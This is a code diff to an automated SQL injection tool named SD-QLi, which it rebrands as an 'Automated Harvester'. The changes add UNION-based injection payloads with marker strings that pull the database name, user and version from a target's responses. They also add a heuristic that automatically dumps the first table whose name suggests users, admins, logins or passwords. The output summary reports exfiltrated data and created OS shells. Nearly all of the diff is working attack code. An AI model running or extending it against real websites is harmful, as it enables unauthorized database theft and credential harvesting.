@@ -160,7 +160,7 @@ class SDQLi:
     ╚════██║██║  ██║ ╚════╝██║▄▄ ██║██║     ██║
     ███████║██████╔╝       ╚██████╔╝███████╗██║
     ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
-    {Colors.END}                 {Colors.BOLD}v2.4 - SD-QLi (DC-9 Special Edition){Colors.END}
+    {Colors.END}                 {Colors.BOLD}v2.5 - SD-QLi (Automated Harvester){Colors.END}
         """
         print(banner)
 
@@ -440,21 +440,22 @@ class SDQLi:
         print(f"[*] Extracting basic database info...")
         for label, query in info_queries.items():
             temp_cols = [f"'{i}'" for i in range(1, column_count + 1)]
-            temp_cols[ref_idx-1] = query
-            exfil_payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- "
+            marker = f"SD_{label.upper()}"
+            temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
+            exfil_payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- -"
             current_params[param_name] = exfil_payload
             
             try:
                 if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
                 else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
                 
-                # Try to extract the value from reflection points
-                found_val = False
-                for idx in reflected_indices:
-                    # Very simple regex-like search between surrounding column markers
-                    # This is just for user display, they can also see it in manual proofs
-                    pass
-                print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: {Colors.BOLD}Extracted{Colors.END}")
+                match = re.search(f"{marker}(.*?){marker}", r.text, re.DOTALL)
+                if match:
+                    val = match.group(1).strip()
+                    print(f"  {Colors.GREEN}[+]{Colors.END} {label}: {Colors.CYAN}{val}{Colors.END}")
+                    with self.lock: self.results[label.lower()] = val
+                else:
+                    print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: {Colors.BOLD}Extraction hidden/filtered{Colors.END}")
             except: pass
 
         # 4. Automated Full Schema Discovery (New v2.3)
@@ -492,10 +493,18 @@ class SDQLi:
 
         # Default discovery if no flags passed
         if not any([args.dbs, args.tables, args.columns, args.dump]):
-            print(f"[*] {Colors.BOLD}Auto-Discovery{Colors.END}: Fetching Databases & Tables...")
+            print(f"[*] {Colors.BOLD}Smart Discovery{Colors.END}: Fetching Databases & Tables...")
             self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
             curr_db = self.results['database'] or "current"
             self.get_tables(param_name, current_params, col_count, ref_idx, db=curr_db, prefix=prefix)
+            
+            # v2.5 Smart Auto-Dump Heuristic
+            interesting_keywords = ['user', 'staff', 'admin', 'account', 'member', 'login', 'pass', 'detail']
+            for table in self.results['tables']:
+                if any(k in table.lower() for k in interesting_keywords):
+                    print(f"[*] {Colors.GREEN}Identifying High-Value table{Colors.END}: {Colors.BOLD}{table}{Colors.END}")
+                    self.dump_table(param_name, current_params, col_count, ref_idx, table, db=curr_db, prefix=prefix)
+                    break # Just dump the first high-value table automatically
 
     def blind_manager(self, param_name, current_params):
         """Manages Time-based Blind exfiltration (v2.3 Robust)"""
@@ -774,10 +783,16 @@ class SDQLi:
         if 'union_info' in self.results:
             u = self.results['union_info']
             print(f"\n{Colors.GREEN}[+] DATA EXFILTRATION:{Colors.END}")
+            if self.results['database']:
+                print(f"  - Database: {Colors.CYAN}{self.results['database']}{Colors.END}")
+                print(f"  - User:     {Colors.CYAN}{self.results['user']}{Colors.END}")
+                print(f"  - Version:  {Colors.CYAN}{self.results['version']}{Colors.END}")
             print(f"  - Columns Found: {u['count']} (Reflected: {u['reflected']})")
+            if self.results['databases']:
+                print(f"  - Databases Discovered: {', '.join(self.results['databases'])}")
             if self.results['tables']:
                 print(f"  - Tables Discovered: {Colors.CYAN}{', '.join(self.results['tables'])}{Colors.END}")
-            print(f"  - Status: Full table extraction performed via information_schema.")
+            print(f"  - Extraction Method: UNION-based exfiltration.")
         
         if self.results['os_shell']:
             print(f"\n{Colors.GREEN}[+] CREATED OS SHELLS:{Colors.END}")
@@ -805,7 +820,7 @@ class SDQLi:
         print("="*70)
 
 def main():
-    parser = argparse.ArgumentParser(description='SD-QLi v2.3 - Industrial Automated SQLi Scanner')
+    parser = argparse.ArgumentParser(description='SD-QLi v2.5 - Industrial Automated SQLi Scanner')
     parser.add_argument('-u', '--url', help='Target URL')
     parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP Method')
     parser.add_argument('-d', '--data', help='POST data (e.g. "id=1&user=admin")')
